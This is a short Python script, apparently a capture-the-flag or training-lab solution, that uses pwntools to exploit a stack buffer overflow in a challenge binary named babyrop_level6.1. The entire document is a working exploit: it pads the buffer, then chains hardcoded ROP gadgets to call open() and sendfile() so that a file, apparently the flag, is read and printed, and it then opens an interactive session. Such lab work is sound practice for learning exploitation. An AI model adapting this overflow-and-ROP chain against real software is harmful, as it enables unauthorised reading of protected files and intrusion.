from pwn import *
import time

# Init
elf = ELF("/challenge/babyrop_level6.1")
context.arch = "amd64"
context.endian = "little"
io = elf.process()

# Vars
buffer_length = 124 + 4 + 8 # local_88 and variable int 4 byte (local_c) + EBP

open_function_addr = p64(0x00401100)
sendfile_function_addr = p64(0x004010e0)
leaving_addr = p64(0x402004)
set_rdi_registry_gadget = p64(0x0000000000401e46)
set_rsi_registry_gadget = p64(0x0000000000401e36)
set_rdx_registry_gadget = p64(0x0000000000401e3e)
set_rcx_registry_gadget = p64(0x0000000000401e4e)

# Payload
payload = b"A"*buffer_length + set_rdi_registry_gadget + leaving_addr + set_rsi_registry_gadget + p64(0x0) + set_rdx_registry_gadget + p64(0x0) + open_function_addr +\
    set_rdi_registry_gadget + p64(0x1) + set_rsi_registry_gadget + p64(0x3) + set_rdx_registry_gadget + p64(0x0) + set_rcx_registry_gadget + p64(0x100) + sendfile_function_addr 


# Action
io.sendline(payload)
io.interactive()
